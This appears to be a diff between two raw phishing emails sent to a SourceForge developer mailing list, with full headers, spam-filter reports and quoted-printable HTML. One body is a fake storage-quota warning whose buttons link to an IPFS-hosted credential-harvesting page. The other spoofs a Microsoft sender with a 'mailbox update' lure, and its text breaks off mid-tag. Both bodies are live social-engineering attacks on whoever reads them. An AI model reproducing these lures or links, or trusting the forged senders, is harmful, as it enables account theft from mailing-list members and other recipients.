@@ -2,97 +2,85 @@ Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
 X-Original-To: lists+industrypack-devel@lfdr.de
 Delivered-To: lists+industrypack-devel@lfdr.de
 Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
-	by mail.lfdr.de (Postfix) with ESMTPS id 4F7508C5B61
-	for <lists+industrypack-devel@lfdr.de>; Tue, 14 May 2024 20:51:48 +0200 (CEST)
-Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
-	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
+	by mail.lfdr.de (Postfix) with ESMTPS id D375F8C6D11
+	for <lists+industrypack-devel@lfdr.de>; Wed, 15 May 2024 22:06:21 +0200 (CEST)
+Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
+	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
 	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
-	id 1s6xFa-0003Q2-MY
+	id 1s7KtJ-0006Av-7r
 	for lists+industrypack-devel@lfdr.de;
-	Tue, 14 May 2024 18:51:47 +0000
+	Wed, 15 May 2024 20:06:20 +0000
 Received: from [172.30.20.202] (helo=mx.sourceforge.net)
- by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
+ by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
- (envelope-from <mail@akelloandassociate.com>) id 1s6xFZ-0003Pv-Jx
+ (envelope-from <noreply@microsoft.com>) id 1s7KtH-0006Ap-V4
  for industrypack-devel@lists.sourceforge.net;
- Tue, 14 May 2024 18:51:46 +0000
+ Wed, 15 May 2024 20:06:19 +0000
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
  d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
  :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
  Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
  :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
  List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=7rImd9C7zzZm6tuFR6q/Wbxc/YoiqICLKvipEUJDI2Q=; b=f9hBkLJak0Ao8I3OqC0GtBE6De
- RLfLjgWnLF24t0ODpBrfW0J3O7HX+hbwIljj8c4Hm7L60GjPl39/VhZ1liJHV4FaKrFyumYHP3d4A
- 1ULOy86F0erYO1GApccoY+BJTGhowCc5qnoSs5llyoaGsiUf/S4+XMMmNcZVjSzz+8aA=;
+ bh=hX88QoVPH8ljukyNsTkQSC0Hcw8wyzLlbPtGw8kYPgI=; b=hXAeusE6vrSsbqvzrtNN530BuM
+ f/A9T+y60Ju1/vfxN6YJz/wcIlEaj5q2ZedVDIEfQ1RelDpCzdZP+SgOvMv7lew7lzSDDW4H3EBD6
+ ioOCr8D0KuDhTLNzuhXmhjm2Mc7a3Vhzy0axZ2rfRQFigq7YL0PtSy0KKxKpcA9ZpCJU=;
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
  ;
  h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
  Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
  :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
  References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
- List-Owner:List-Archive; bh=7rImd9C7zzZm6tuFR6q/Wbxc/YoiqICLKvipEUJDI2Q=; b=O
- /9YhsWFhJVUfl28ym6UsDO9Hx1ecPDI7gCgnSSE2jwJwbmB219goB6zh8BLiA8yZNGpfThdYEe3xb
- v7bYyTP3GVwhIlZ2zfeXauVe1Mw41bw5A7tN5qvvRxgssOlY0IJW4gvSm9JjffIsIV4A99oHYIz4E
- 2gFoVzLRbyt/Da8Q=;
-Received: from [93.185.159.247] (helo=mail9.akelloandassociate.com)
- by sfi-mx-2.v28.lw.sourceforge.com with esmtps
- (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
- id 1s6xFa-0005px-1W for industrypack-devel@lists.sourceforge.net;
- Tue, 14 May 2024 18:51:45 +0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=dkim;
- d=akelloandassociate.com; 
- h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
- Content-Transfer-Encoding; i=mail@akelloandassociate.com;
- bh=7rImd9C7zzZm6tuFR6q/Wbxc/YoiqICLKvipEUJDI2Q=;
- b=G4N0mhqYL+dWdcx9DQl9W23IAfj7rJutmFuIXRJ+s3pNFu9O+gBDnXPtyHE2Vh1ORf5VJo2P7kWA
- ItohoIloNMH/Eq9k5cS9TbuWk9e9sMlEWeCxfjJ0VCkKQKIw9JgTqSVesRpy9zYy/YgL/eWMU6Mz
- U/aMy5grETSfyq2l+TXJ60mo4V2/HYKbay0XE3PjdLL+brAc3xmnBRi3uxy1RTpkcjPHUBRDrZ2h
- LzuFsDnFcp8RPQEoQ+152f2VEIippdWJAbSP3QiQgMzf2FSxEn2nOaR02PgCNges8eeK/v/Ccl4E
- 6X5fMb9oc1xYch/MjkvqDegig5k0uM2BkxFekg==
-From: lists.sourceforge.net<mail@akelloandassociate.com>
+ List-Owner:List-Archive; bh=hX88QoVPH8ljukyNsTkQSC0Hcw8wyzLlbPtGw8kYPgI=; b=W
+ +1nVRyRIudxjFJj/cqP/kQb098pYMzQ6QGJN2USULaf1z7rd9P+EZCs3jnzO3n/7/j0WhSIU6pmGx
+ Cfc9+Zd6IJ3lN6i3NbErNk2t+AU0OBmrT2hYxu8MpFKEKLd6mbmzF925tjKLkyvt5c7AxAsdTk7Bd
+ 0pprxVt6PbSxT9cQ=;
+Received: from [195.19.93.40] (helo=pev.egyptiust.com)
+ by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
+ id 1s7KtH-0007af-5b for industrypack-devel@lists.sourceforge.net;
+ Wed, 15 May 2024 20:06:19 +0000
+Received: from microsoft.com (localhost [IPv6:::1])
+ by pev.egyptiust.com (Postfix) with ESMTP id EEA5C2B6044
+ for <industrypack-devel@lists.sourceforge.net>;
+ Wed, 15 May 2024 22:32:48 +0300 (MSK)
 To: industrypack-devel@lists.sourceforge.net
-Date: 14 May 2024 20:51:36 +0200
-Message-ID: <20240514205136.0C751B6E27C24E9B@akelloandassociate.com>
+Date: 15 May 2024 22:32:48 +0300
+Message-ID: <20240515223248.EC8D69790B2B6836@microsoft.com>
 MIME-Version: 1.0
-X-Spam-Score: 6.5 (++++++)
+X-Spam-Score: 4.5 (++++)
 X-Spam-Report: Spam detection software,
- running on the system "util-spamd-1.v13.lw.sourceforge.com", 
- has identified this incoming email as possible spam.  The original
+ running on the system "util-spamd-2.v13.lw.sourceforge.com", 
+ has NOT identified this incoming email as spam.  The original
  message has been attached to this so you can view it or label
  similar future email.  If you have any questions, see
  the administrator of that system for details.
- Content preview:  98.3 GB used,
- 94% of 99 GB. ATTN: industrypack-devel@lists.sourceforge.net, 
- Your "industrypack-devel" account is almost full and you have run out of
- storage space. Go to View all settings to authorize purging of unwanted
- documents and messages. 
- Content analysis details:   (6.5 points, 6.0 required)
+ Content preview:  Message from Trusted server. Valued industrypack-devel, You
+ have an important mailbox update, click below to complete your mailbox update.
+ UPDATE MAILBOX 
+ Content analysis details:   (4.5 points, 6.0 required)
  pts rule name              description
  ---- ---------------------- --------------------------------------------------
  0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
  blocked.  See
  http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
  for more information. [URIs: cloudflare-ipfs.com]
- -0.0 SPF_PASS               SPF: sender matches SPF record
+ 0.0 SPF_NONE               SPF: sender does not publish an SPF Record
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
+ 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
+ identical to background
  0.0 HTML_MESSAGE           BODY: HTML included in message
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
- 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
- valid
- -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
- envelope-from domain
- -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
- author's domain
- -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
+ 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
  2.5 URI_CLOUDFLAREIPFS     References Interplanetary File System PtP
  content via CloudFlare, likely phishing
- 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
- 0.5 GOOG_REDIR_NORDNS      Google redirect to obscure spamvertised
- website + no rDNS
- 2.4 TO_NO_BRKTS_FROM_MSSP  Multiple header formatting problems
-X-Headers-End: 1s6xFa-0005px-1W
-Subject: [Industrypack-devel] System Downtime (Action Required)
+ 0.4 PDS_FROM_NAME_TO_DOMAIN From:name looks like To:domain
+ 0.2 PDS_FRNOM_TODOM_NAKED_TO Naked to From name equals to Domain
+ 0.0 NORDNS_LOW_CONTRAST    No rDNS + hidden text
+ 0.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
+ only 0.0 URI_PHISH              Phishing using web form
+X-Headers-End: 1s7KtH-0007af-5b
+Subject: [Industrypack-devel] Important mailbox update -
+ industrypack-devel@lists.sourceforge.net.
 X-BeenThere: industrypack-devel@lists.sourceforge.net
 X-Mailman-Version: 2.1.21
 Precedence: list
@@ -104,146 +92,211 @@ List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
 List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
  <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
-Content-Type: multipart/mixed; boundary="===============8807339114717639922=="
+From: "lists.sourceforge.net via Industrypack-devel"
+ <industrypack-devel@lists.sourceforge.net>
+Reply-To: "lists.sourceforge.net" <noreply@microsoft.com>
+Content-Type: multipart/mixed; boundary="===============2270109010848851525=="
 Errors-To: industrypack-devel-bounces@lists.sourceforge.net
 
---===============8807339114717639922==
-Content-Type: text/html;
-	charset="iso-8859-1"
+--===============2270109010848851525==
+Content-Type: text/html
 Content-Transfer-Encoding: quoted-printable
-
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
-w3.org/TR/html4/loose.dtd">
 
 <HTML><HEAD>
 <META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
-<body style=3D"MARGIN: 0.5em">
-<table style=3D"FONT-SIZE: 11px; FONT-FAMILY: &quot;Lucida Grande&quot;, Ve=
-rdana, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px=
-; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR:=
- rgb(51,51,51); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS:=
- 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: norma=
+<BODY>
+<DIV class=3Dgmail-rcmBody style=3D'FONT-SIZE: 12px; FONT-FAMILY: "Lucida G=
+rande", Verdana, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SP=
+ACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT=
+-STYLE: normal; ORPHANS: 2; WIDOWS: 2; MARGIN: 8px; LETTER-SPACING: normal;=
+ BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial'>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 15px; FONT-FAMILY: wf; BOR=
+DER-RIGHT-WIDTH: 0px; BORDER-TOP-COLOR: ; WIDTH: 477px; VERTICAL-ALIGN: bas=
+eline; BORDER-BOTTOM-WIDTH: 0px; FLOAT: left; COLOR: rgb(32,31,30); PADDING=
+-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LEFT: 0px; MARGIN: 0px 0px 0px 18px=
+; PADDING-RIGHT: 5px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit; font-va=
+riant-numeric: inherit; font-variant-east-asian: inherit; border-image: non=
+e 100% / 1 / 0 stretch; text-size-adjust: auto">
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 13px; BORDER-RIGHT-WIDTH: =
+0px; BORDER-TOP-COLOR: ; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px=
+; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LEFT: 3px; MARGIN: 0px; PA=
+DDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(244,248,245)=
+; font-variant-ligatures: inherit; font-variant-caps: inherit; font-stretch=
+: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit;=
+ border-image: none 100% / 1 / 0 stretch;=20
+font-variant-alternates: inherit"><SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FO=
+NT-FAMILY: inherit; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORD=
+ER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: =
+0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-variant-c=
+aps: inherit; font-stretch: inherit; border-image: none 100% / 1 / 0 stretc=
+h">Mes<WBR>sage from Trusted server.</SPAN></DIV></DIV>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 15px; FONT-FAMILY: wf; BOR=
+DER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; C=
+OLOR: rgb(32,31,30); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0=
+px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: i=
+nherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; bo=
+rder-image: none 100% / 1 / 0 stretch; text-size-adjust: auto">
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 12px; HEIGHT: 30px; FONT-F=
+AMILY: inherit; BORDER-RIGHT-WIDTH: 0px; BORDER-TOP-COLOR: ; WIDTH: 5px; VE=
+RTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 2px; PADD=
+ING-TOP: 2px; PADDING-LEFT: 2px; MARGIN: 0px; PADDING-RIGHT: 2px; BORDER-TO=
+P-WIDTH: 0px; BACKGROUND-COLOR: rgb(86,166,89); font-variant-caps: inherit;=
+ font-stretch: inherit; border-image: none 100% / 1 / 0 stretch"></DIV>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 16px; FONT-FAMILY: Calibri=
+, sans-serif, serif, EmojiFont; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: ba=
+seline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 20px; PADDING-TOP: 20px; =
+PADDING-LEFT: 20px; MARGIN: 0px; PADDING-RIGHT: 20px; BORDER-TOP-WIDTH: 0px=
+; font-variant-ligatures: inherit; font-variant-caps: inherit; font-stretch=
+: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit;=
+ border-image: none 100% / 1 / 0 stretch;=20
+font-variant-alternates: inherit">
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 12px; FONT-FAMILY: inherit=
+; BORDER-RIGHT-WIDTH: 0px; BORDER-TOP-COLOR: ; VERTICAL-ALIGN: baseline; BO=
+RDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT=
+: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-variant=
+-caps: inherit; font-stretch: inherit; border-image: none 100% / 1 / 0 stre=
+tch">
+<P style=3D"FONT-FAMILY: inherit"><BR></P></DIV></DIV></DIV></DIV>
+<DIV style=3D"FONT-SIZE: 14px; FONT-FAMILY: arial; WHITE-SPACE: normal; WOR=
+D-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); =
+FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROU=
+ND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: norma=
 l; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorati=
-on-thickness: initial; text-decoration-style: initial;=20
-text-decoration-color: initial" cellspacing=3D"0" cellpadding=3D"0" width=
-=3D"325" border=3D"0">
-<TBODY style=3D"BOX-SIZING: border-box">
-<TR style=3D"BOX-SIZING: border-box; HEIGHT: 0.5em">
-<td style=3D"BOX-SIZING: border-box; WIDTH: 321px; BACKGROUND: rgb(218,60,4=
-7); MARGIN: 0px"><FONT face=3D"Segoe UI">&nbsp;</FONT></TD>
-<td style=3D"BOX-SIZING: border-box; BACKGROUND: rgb(224,224,224); MARGIN: =
-0px"><FONT face=3D"Segoe UI">&nbsp;</FONT></TD></TR></TBODY></TABLE>
-<table style=3D"FONT-SIZE: 11px; FONT-FAMILY: &quot;Lucida Grande&quot;, Ve=
-rdana, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px=
-; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR:=
- rgb(51,51,51); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS:=
- 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: norma=
-l; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorati=
-on-thickness: initial; text-decoration-style: initial;=20
-text-decoration-color: initial" cellspacing=3D"0" cellpadding=3D"0" width=
-=3D"325" border=3D"0">
-<TBODY style=3D"BOX-SIZING: border-box">
-<TR style=3D"BOX-SIZING: border-box">
-<td style=3D"BOX-SIZING: border-box; TEXT-ALIGN: left; MARGIN: 0px"><FONT c=
-olor=3D#ff0000>98.3 GB used, 94% of 99 GB.</FONT></TD></TR></TBODY></TABLE>=
+on-thickness: initial; text-decoration-style: initial; text-decoration-colo=
+r: initial">
+<TABLE style=3D"BORDER-COLLAPSE: collapse" height=3D"100%" cellSpacing=3D0 =
+cellPadding=3D0 width=3D"100%" align=3Dcenter bgColor=3D#f5f7f8 border=3D0>=
 
-<table style=3D"FONT-SIZE: 11px; FONT-FAMILY: &quot;Lucida Grande&quot;, Ve=
-rdana, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px=
-; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR:=
- rgb(51,51,51); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS:=
- 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: norma=
-l; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorati=
-on-thickness: initial; text-decoration-style: initial;=20
-text-decoration-color: initial" cellspacing=3D"0" cellpadding=3D"0" width=
-=3D"325" border=3D"0">
-<TBODY style=3D"BOX-SIZING: border-box"></TBODY></TABLE>
-<table style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Helvetica, sans-serif;=
- WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT:=
- 400; COLOR: rgb(32,31,30); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETT=
-ER-SPACING: normal; font-variant-ligatures: normal; font-variant-caps: norm=
-al; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; tex=
-t-decoration-style: initial; text-decoration-color: initial; font-variant-n=
-umeric: inherit; font-variant-east-asian: inherit;=20
-font-stretch: inherit" dir=3D"ltr">
 <TBODY>
 <TR>
-<td id=3D"m_8330243534843323916m_-4121981575604976097m_-3491940333626431258=
-m_-8153822838275037621m_-2602578588484872429gmail-m_-2922676154068261556gma=
-il-x_x_i10_mr_css_attr" style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;Segoe =
-UI&quot;, Tahoma, Verdana, Arial, sans-serif; COLOR: rgb(42,42,42); PADDING=
--BOTTOM: 0px; PADDING-TOP: 25px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RI=
-GHT: 0px">
-<P><B>ATTN: industrypack-devel@lists.sourceforge.net,<BR></B><BR>Your "<FON=
-T color=3D#2c59d3>industrypack-devel</FONT>" account is almost full and you=
- have run out of storage space.<BR>Go to View all settings to authorize pur=
-ging of unwanted documents and messages.</P></TD></TR>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: inherit; MARGIN: 0px" height=3D3=
+0 vAlign=3Dtop align=3Dcenter><BR></TD></TR>
 <TR>
-<td style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;Segoe UI&quot;, Tahoma, Ve=
-rdana, Arial, sans-serif; COLOR: rgb(42,42,42); PADDING-BOTTOM: 0px; PADDIN=
-G-TOP: 25px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
-<table cellspacing=3D"0" border=3D"0">
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: inherit; MARGIN: 0px" vAlign=3Dt=
+op width=3D600 align=3Dcenter>
+<TABLE style=3D"MAX-WIDTH: 600px; BORDER-COLLAPSE: collapse; border-image: =
+none 100% / 1 / 0 stretch" cellSpacing=3D0 cellPadding=3D0 align=3Dcenter b=
+order=3D0>
 <TBODY>
 <TR>
-<td style=3D"MIN-WIDTH: 50px; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDIN=
-G-LEFT: 20px; MARGIN: 0px; PADDING-RIGHT: 20px; BACKGROUND-COLOR: rgb(38,11=
-4,236)" bgcolor=3D"#2672ec">
-<A id=3Dm_8330243534843323916m_-4121981575604976097m_-3491940333626431258m_=
--8153822838275037621m_-2602578588484872429gmail-m_-2922676154068261556gmail=
--x_x_i11_mr_css_attr style=3D'BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: "Segoe U=
-I Semibold", "Segoe UI Bold", "Segoe UI", "Helvetica Neue Medium", Arial, s=
-ans-serif; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM=
--WIDTH: 0px; FONT-WEIGHT: 600; COLOR: rgb(255,255,255); PADDING-BOTTOM: 0px=
-; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px;=20
-LETTER-SPACING: 0.02em; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-str=
-etch: inherit; text-decoration-line: none' href=3D"https://cloudflare-ipfs.=
-com/ipfs/bafkreigwvnwjiwr4fl6pwxfaaoro5x46zi7klxxuka3z2ez5xgqvrg2hjm?filena=
-me=3Dgrgeon221.html#industrypack-devel@lists.sourceforge.net" rel=3D"noopen=
-er noreferrer" target=3D_blank=20
-data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://cloudflare-i=
-pfs.com/ipfs/bafkreiexrpykdb6634fcxcordg2j5he7efxedjfenf764f25gmzxqzzjdm%23=
-%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1713379845859000&amp;usg=
-=3DAOvVaw0yaHSPGKEKF9sgrN0bejl-">View lists.sourceforge.net settings</A></T=
-D></TR></TBODY></TABLE></TD></TR>
+<TD style=3D"MAX-WIDTH: 600px; FONT-FAMILY: inherit; MARGIN: 0px" bgColor=
+=3D#ffffff vAlign=3Dtop width=3D600 align=3Dcenter>
+<TABLE style=3D"BORDER-COLLAPSE: collapse" cellSpacing=3D0 cellPadding=3D0 =
+width=3D"100%" align=3Dcenter border=3D0>
+<TBODY>
 <TR>
-<td id=3D"m_8330243534843323916m_-4121981575604976097m_-3491940333626431258=
-m_-8153822838275037621m_-2602578588484872429gmail-m_-2922676154068261556gma=
-il-x_x_i12_mr_css_attr" style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;Segoe =
-UI&quot;, Tahoma, Verdana, Arial, sans-serif; COLOR: rgb(42,42,42); PADDING=
--BOTTOM: 0px; PADDING-TOP: 25px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RI=
-GHT: 0px">
-To opt out or change where you receive security notifications,&nbsp;<A id=
-=3Dm_8330243534843323916m_-4121981575604976097m_-3491940333626431258m_-8153=
-822838275037621m_-2602578588484872429gmail-m_-2922676154068261556gmail-x_x_=
-iLink5_mr_css_attr style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px=
-; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(38,114,236=
-); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; P=
-ADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px;=20
-text-decoration-line: none" href=3D"https://cloudflare-ipfs.com/ipfs/bafkre=
-igwvnwjiwr4fl6pwxfaaoro5x46zi7klxxuka3z2ez5xgqvrg2hjm?filename=3Dgrgeon221.=
-html#industrypack-devel@lists.sourceforge.net" rel=3D"noopener noreferrer" =
-target=3D_blank data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp=
-s://cloudflare-ipfs.com/ipfs/bafkreiexrpykdb6634fcxcordg2j5he7efxedjfenf764=
-f25gmzxqzzjdm%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1713379845=
-859000&amp;usg=3DAOvVaw0yaHSPGKEKF9sgrN0bejl-">Click here</A>.</TD></TR>
+<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" vAlign=3Dtop align=3Dcenter=
+>
+<TABLE style=3D"BORDER-COLLAPSE: collapse" cellSpacing=3D0 cellPadding=3D0 =
+width=3D"92%" align=3Dcenter border=3D0>
+<TBODY>
 <TR>
-<td id=3D"m_8330243534843323916m_-4121981575604976097m_-3491940333626431258=
-m_-8153822838275037621m_-2602578588484872429gmail-m_-2922676154068261556gma=
-il-x_x_i13_mr_css_attr" style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;Segoe =
-UI&quot;, Tahoma, Verdana, Arial, sans-serif; COLOR: rgb(42,42,42); PADDING=
--BOTTOM: 0px; PADDING-TOP: 25px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RI=
-GHT: 0px">Thanks,<BR>lists.sourceforge.net Support.</TD></TR></TBODY></TABL=
-E>
-<P></P></BODY></HTML>
+<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" vAlign=3Dtop align=3Dcenter=
+>
+<TABLE style=3D"BORDER-COLLAPSE: collapse" cellSpacing=3D0 cellPadding=3D0 =
+width=3D"100%" align=3Dcenter>
+<TBODY>
+<TR>
+<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" height=3D30><BR></TD></TR>
+<TR>
+<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" height=3D32><BR></TD></TR>
+<TR>
+<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" vAlign=3Dtop>
+<TABLE style=3D"BORDER-COLLAPSE: collapse" cellSpacing=3D0 cellPadding=3D0 =
+width=3D"90%">
+<TBODY>
+<TR>
+<TD style=3D"FONT-FAMILY: Roboto, Arial; FONT-WEIGHT: 600; COLOR: rgb(51,51=
+,51); MARGIN: 0px; LINE-HEIGHT: 18px" vAlign=3Dtop>Valued industrypack-deve=
+l,</TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" vAlign=3Dtop>
+<TABLE style=3D"BORDER-COLLAPSE: collapse" cellSpacing=3D0 cellPadding=3D0 =
+width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" height=3D25><BR></TD></TR>
+<TR>
+<TD style=3D"FONT-SIZE: 13px; FONT-FAMILY: Roboto, Arial; COLOR: rgb(102,10=
+2,102); MARGIN: 0px; LINE-HEIGHT: 19px"><FONT style=3D"VERTICAL-ALIGN: inhe=
+rit"><FONT style=3D"VERTICAL-ALIGN: inherit">You have an important mailbox =
+update, click below to complete your mailbox update.</FONT></FONT></TD></TR=
+></TBODY></TABLE></TD></TR>
+<TR>
+<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" height=3D20 vAlign=3Dtop al=
+ign=3Dleft><BR></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" vAlign=3Dtop align=3Dcenter=
+><BR>
+<TABLE style=3D"BORDER-COLLAPSE: collapse" cellSpacing=3D0 cellPadding=3D0 =
+align=3Dcenter border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" bgColor=3D#f3565d height=3D=
+40 width=3D288 align=3Dcenter><A style=3D"FONT-SIZE: 14px; FONT-FAMILY: Rob=
+oto, Arial; TEXT-TRANSFORM: uppercase; COLOR: rgb(255,255,255); OUTLINE-WID=
